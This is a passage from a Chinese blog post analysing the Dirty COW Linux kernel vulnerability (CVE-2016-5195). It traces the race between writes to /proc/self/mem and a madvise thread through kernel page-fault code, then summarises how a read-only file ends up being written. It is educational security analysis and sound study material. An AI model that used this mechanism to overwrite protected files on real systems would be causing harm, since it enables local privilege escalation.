foll_flags, &amp;page_mask);				<span class="comment">// 获取页表项，这里的start与vma-&gt;vm_start是我们exp中的map指针。</span></span><br><span class="line">                ..</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__get_user_pages</span><br></pre></td></tr></table></figure>



<h4 id="（3）madvise与第三次write"><a href="#（3）madvise与第三次write" class="headerlink" title="（3）madvise与第三次write"></a>（3）madvise与第三次write</h4><h5 id="get-user-pages-2"><a href="#get-user-pages-2" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h5><p>此时是第三次走到了__get_user_pages 函数，这次的执行与前两次略有不同，在执行cond_resched 函数时，由于madvise线程的介入，madvise(dontneed)系统调用在内核里的 zap_page_range()函数会去解除页的映射关系。</p>
<p>此时回到write的线程，调用follow_page_mask来获取page结构，由于page已经被madvise 线程释放掉了，该page的pte entry不是有效的pte并且PRESENT也没有被置为，所以follow_page_mask返回NULL，触发缺页中断。注意此时FOLL_WRITE已经被置为0了，不需要检查写权限了，所以这里不是写缺页中断而是读缺页中断。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">                struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">retry:</span><br><span class="line">               ...</span><br><span class="line">                cond_resched();																							<span class="comment">// 由于madvise线程的介入，解除了页的映射关系。</span></span><br><span class="line">                page = follow_page_mask(vma, start, foll_flags, &amp;page_mask);				<span class="comment">// 获取页表项，这里的start与vma-&gt;vm_start是我们exp中的map指针。</span></span><br><span class="line">                ..</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="handle-pte-fault-2"><a href="#handle-pte-fault-2" class="headerlink" title="handle_pte_fault"></a>handle_pte_fault</h5><p>这里判断了缺页的类型，由于该页的 pte entry 不是有效的、PRESENT 位也没被置位，所以跟入do_fault 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： faultin_page() -&gt; handle_mm_fault() -&gt; __handle_mm_fault() -&gt; handle_pte_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">handle_pte_fault</span><span class="params">(struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">                     struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> address,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">pte_t</span> *pte, <span class="keyword">pmd_t</span> *pmd, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">pte_t</span> entry;</span><br><span class="line">        <span class="keyword">spinlock_t</span> *ptl;</span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">if</span> (!pte_present(entry)) &#123;										<span class="comment">// 这里的PRESENT 标志位为0，走入该分支</span></span><br><span class="line">                <span class="keyword">if</span> (pte_none(entry)) &#123;									<span class="comment">// pte entry失效，走入该分支</span></span><br><span class="line">                        <span class="keyword">if</span> (vma_is_anonymous(vma))</span><br><span class="line">                                <span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">                                                         pte, pmd, flags);</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                                <span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,				<span class="comment">// 跟进</span></span><br><span class="line">                                                flags, entry);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">                                        pte, pmd, flags, entry);</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br><span class="line">        <span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;						</span><br><span class="line">                <span class="keyword">if</span> (!pte_write(entry))									</span><br><span class="line">                        <span class="keyword">return</span> do_wp_page(mm, vma, address,			</span><br><span class="line">                                        pte, pmd, ptl, entry);</span><br><span class="line">                entry = pte_mkdirty(entry);</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">unlock:</span><br><span class="line">        pte_unmap_unlock(pte, ptl);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="do-read-fault"><a href="#do-read-fault" class="headerlink" title="do_read_fault"></a>do_read_fault</h5><p>由于是读错误缺页中断，所以跳转到do_read_fault 函数。这里直接将文件的内容映射到page chae中。（注意之前madvise 释放的是处理cow过程中产生的匿名page）。这样一个可写的page cache已经新鲜出炉了！，之后在__get_user_pages 函数在做一次retry就可以正确的返回该页的page结构了，之后使用kmap重新映射然后写入想要的内容将该页dirty，系统回写机制会将内容写入到这个只读文件中，整个流程完成了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数调用： handle_pte_fault() -&gt; do_fault() -&gt; do_read_fault()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_read_fault</span><span class="params">(struct mm_struct *mm, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">pmd_t</span> *pmd,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">pgoff_t</span> pgoff, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags, <span class="keyword">pte_t</span> orig_pte)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	...</span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, <span class="literal">NULL</span>, &amp;fault_page);</span><br><span class="line">	...</span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);</span><br><span class="line">	...</span><br><span class="line">	do_set_pte(vma, address, fault_page, pte, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h3><h4 id="详细总结"><a href="#详细总结" class="headerlink" title="详细总结"></a>详细总结</h4><p>dirtycow 程序目的是要写一个只读文件的内容（vma -&gt; flags 为只读属性），由于 page cache 的机制，写的是文件对应的page cache。</p>
<p>但由于第一次去写，页不在内存中并且 pte entry 不是有效的，所以调用了 do_cow_page()函数去处理COW，这时候会将该文件的内容映射到 page cache 中，然后把 page cache 的内容复制到了一个新的匿名页面中。这个新匿名页面的 pte entry 属性是 Dirty | RDONLY。</p>
<p>之后再去尝试 follow_page()，但是不成功，那是因为 FOLL_WRITE 和 pte entry 是 RDONLY，所以再去来一次写错误缺页中断。这回跑到 do_wp_page()里，该函数看到这个页是个匿名页面并且可以复用，那 么尝试修改 pte entry 的 write 属性，但是不成功，因为 vma-&gt;flags 只读属性的紧箍咒还在呢。 do_wp_page()返回 VM_FAULT_WRITE 了，在返回途中 faultin_page()把 FOLL_WRITE 给弄丢 了，这是这个问题的关键之一。</p>
<p>返回到__get_user_pages()里要求再来一次 follow_page()。在这次 follow_page()之前，小李飞刀 madvise 线程杀到，把该页给释放了，这是该问题的另外一个关键点。那么 follow_page()必然失败了，这时再造一次缺页中断， 注意这次是只读了，因为 FOLL_WRITE 之前被废了。这样缺页中断重新从文件中读取了 page cache 内容，并且获取了该 page cache 控制权，再往该 page cache 写东西，并且该页设置为 PG_dirty，系统回写机制稍后将完成最终写入了。</p>
<p>如果没有madvise 线程，那么cow生成的只读匿名页面将不会被释放，虽然该匿名页面只读，但是直接使用kmap可以对其进行强制写。虽然可以强制写，但是匿名页面最后的内容最终也不会同步到page cache中，所以也无法达到写只读文件的目的。</p>
<h4 id="简单归纳"><a href="#简单归纳" class="headerlink" title="简单归纳"></a>简单归纳</h4><h5 id="正常流程"><a href="#正常流程" class="headerlink" title="正常流程"></a>正常流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-&gt;write /proc/self/mem 写入一块只读内存</span><br><span class="line">-&gt;page fault（页不在内存，pte entry无效。之后COW复制到一个匿名内存页）</span><br><span class="line">-&gt;page fault（写错误，由于vma_flags只读，do_wp_page尝试将页属性改为可写失败，返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE）</span><br><span class="line">-&gt;对COW生成的匿名页进行强制写（即使该匿名页内存只读，通过内核定位可绕过），最终该匿名页被释放，无事发生。</span><br></pre></td></tr></table></figure>



<h5 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-&gt;write /proc/self/mem 写入一块只读内存</span><br><span class="line">-&gt;page fault（页不在内存，pte entry无效。之后COW复制到一个匿名内存页）</span><br><span class="line">-&gt;page fault（写错误，由于vma_flags只读，do_wp_page尝试将页属性改为可写失败，返回VM_FAULT_WRITE，之后丢掉FOLL_WRITE）</span><br><span class="line">-&gt;madivse释放了COW生成的匿名页</span><br><span class="line">-&gt; 由于内存释放导致再次follow_page失败，遂再次申请内存，由于FOLL_WRITE被丢掉，导致可以写只读page cache，回写机制导致修改了真实文件。</span><br></pre></td></tr></table></figure>





<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/450" >阿里云笑然师傅漏洞分析报告<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619" >漏洞补丁链接<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://bugzilla.redhat.com/show_bug.cgi?id=1384344" >redhat bug跟踪<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/" >clang裁缝店 条件竞争学习 之 DirtyCow分析<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/jasonLee_lijiaqi/article/details/80967912" >qemu+gdb调试linux内核全过程<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98" >虚拟内存维基百科<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/324210723" >x86段寄存器和分段机制<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/michael2012zhao/article/details/5554023" >“段寄存器”的故事<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://zofun.github.io/2020/05/15/%E6%AE%B5%E9%A1%B5%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" >段页式内存管理<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-264199.htm" >看雪 Linux内核[CVE-2016-5195] (dirty COW)原理分析<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://atum.li/2016/10/25/dirtycow/" >Atum CVE-2016-5195 DirtyCow:Linux内核提权漏洞分析<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf" >奔跑吧-Linux内核<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27604276" >从内核角度分析Dirty Cow原理<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   target="_blank" rel="noopener" href="https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/" >Linux Internals: How /proc/self/mem writes to unwritable memory<i class="fas fa-external-link-alt"></i></a></li>
</ol>

        </div>

        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/linux/">#linux</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/04/19/gdb9-2%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8F%92%E4%BB%B6%E5%AE%89%E8%A3%85/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">gdb9.2源码安装以及相关插件安装</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'oP8c99sduOuJjyeVoKafuweh-gzGzoHsz',
                    appKey: 'TwXXvHbKxF0DVsXV22S2uRVG',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '欢迎大家吐槽~',
                    lang: 'en'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'fa1lr4in';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">fa1lr4in</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2016-5195-dirtycow-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">CVE-2016-5195 dirtycow linux本地提权漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9B%B6%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-text">零、前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E3%80%81linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E7%BC%96%E8%AF%91"><span class="nav-text">一、linux内核调试环境编译</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0%E3%80%81%E4%B8%A5%E9%87%8D%E7%9A%84%E9%94%99%E8%AF%AF"><span class="nav-text">0、严重的错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%BA%90%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="nav-text">1、源码获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91"><span class="nav-text">2、内核编译</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%8A%A0%E8%BD%BD%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F"><span class="nav-text">3、加载文件系统镜像</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E5%90%AF%E5%8A%A8qemu"><span class="nav-text">4、启动qemu</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81gdb%E8%B0%83%E8%AF%95"><span class="nav-text">5、gdb调试</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E"><span class="nav-text">二、条件竞争漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E5%AE%9A%E4%B9%89"><span class="nav-text">1、定义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E8%A7%A6%E5%8F%91%E6%9D%A1%E4%BB%B6"><span class="nav-text">2、触发条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E4%BE%8B%E5%AD%90"><span class="nav-text">3、例子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81%E5%BD%A2%E5%BC%8F"><span class="nav-text">4、形式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#CWE-367-TOCTOU-Race-Condition"><span class="nav-text">CWE-367: TOCTOU Race Condition</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%8F%8F%E8%BF%B0"><span class="nav-text">描述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#CWE-365-Race-Condition-in-Switch"><span class="nav-text">CWE-365: Race Condition in Switch</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#CWE-363-Race-Condition-Enabling-Link-Following"><span class="nav-text">CWE-363: Race Condition Enabling Link Following</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CWE-364-Signal-Handler-Race-Condition"><span class="nav-text">CWE-364: Signal Handler Race Condition</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-text">概述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E4%B8%8E%E5%8F%AF%E9%87%8D%E5%85%A5"><span class="nav-text">线程安全与可重入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5%E3%80%81%E9%98%B2%E8%8C%83"><span class="nav-text">5、防范</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%90%8C%E6%AD%A5%E5%8E%9F%E8%AF%AD"><span class="nav-text">同步原语</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98"><span class="nav-text">三、虚拟内存</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8"><span class="nav-text">1、段寄存器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80-1"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BA%A7%E7%94%9F"><span class="nav-text">产生</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#16%E4%BD%8DCPU"><span class="nav-text">16位CPU</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#32%E4%BD%8DCPU"><span class="nav-text">32位CPU</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#64%E4%BD%8DCPU"><span class="nav-text">64位CPU</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#CPU%E5%AF%BB%E5%9D%80%E4%B8%8E%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E6%80%BB%E7%BB%93"><span class="nav-text">CPU寻址与地址转换总结</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%96%91%E9%97%AE"><span class="nav-text">疑问</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81%E9%A1%B5%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-text">2、页式内存管理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD"><span class="nav-text">3、缺页中断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4%E3%80%81-proc-self-mem"><span class="nav-text">4、&#x2F;proc&#x2F;self&#x2F;mem</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#proc"><span class="nav-text">proc</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#proc-self"><span class="nav-text">&#x2F;proc&#x2F;self</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#proc-pid-mem"><span class="nav-text">&#x2F;proc&#x2F;[pid]&#x2F;mem</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E5%86%85%E6%A0%B8%E8%AE%BF%E9%97%AE%E5%86%85%E5%AD%98%E7%9A%84%E6%8E%AA%E6%96%BD"><span class="nav-text">限制内核访问内存的措施</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%86%99%E4%BF%9D%E6%8A%A4%E4%BD%8D-CR0-WP"><span class="nav-text">绕过写保护位 (CR0.WP)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%AE%A8%E8%AE%BA"><span class="nav-text">讨论</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9B%E3%80%81linux-I-O"><span class="nav-text">四、linux I&#x2F;O</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1%E3%80%81page-cache"><span class="nav-text">1、page cache</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%A6%82%E6%9E%9C%E7%A8%8B%E5%BA%8Fcrash%EF%BC%8C%E5%BC%82%E6%AD%A5%E6%A8%A1%E5%BC%8F%E4%BC%9A%E4%B8%A2%E5%A4%B1%E6%95%B0%E6%8D%AE%E5%90%97%EF%BC%9F"><span class="nav-text">（1）如果程序crash，异步模式会丢失数据吗？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8page-cache%E6%83%85%E5%86%B5"><span class="nav-text">（2）查看一个文件占用page cache情况</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="nav-text">（3）一些注意点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2%E3%80%81mmap"><span class="nav-text">2、mmap</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E4%BC%A0%E7%BB%9F%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">（1）传统的文件传输</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89mmap-write"><span class="nav-text">（2）mmap + write</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%883%EF%BC%89mmap%E8%A7%A3%E6%9E%90"><span class="nav-text">（3）mmap解析</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3%E3%80%81%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6%EF%BC%88COW%EF%BC%89"><span class="nav-text">3、内存映射方式与写时复制（COW）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="nav-text">（1）内存映射</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 